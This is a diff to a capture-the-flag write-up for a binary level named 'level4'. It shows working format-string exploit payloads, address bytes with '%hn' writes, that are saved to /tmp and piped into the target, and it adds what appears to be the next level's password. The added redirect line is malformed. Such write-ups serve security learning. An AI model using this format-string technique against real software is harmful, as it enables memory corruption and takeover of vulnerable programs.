@@ -30,7 +30,11 @@ python -c 'print "\x10\x98\x04\x08" + " %x" * 60' | ./level4
 
 - Now we can send it in two parts: 
 ```
-python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08" + "%21820d%12$hn" + "%43966d%13$hn"' | ./level4 
+python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08" + "%21820d%12$hn" + "%43966d%13$hn"' > | /tmp/exploit4
+
+```
+then we use the exploit : 
+``` cat /tmp/exploit4 | ./level4
 ```
 
 ## Moving to level5
@@ -40,3 +44,4 @@ python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08" + "%21820d%12$hn" + "%43966d
 
 2. **Authenticate with the Password**:
     We used the password we found.
+    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
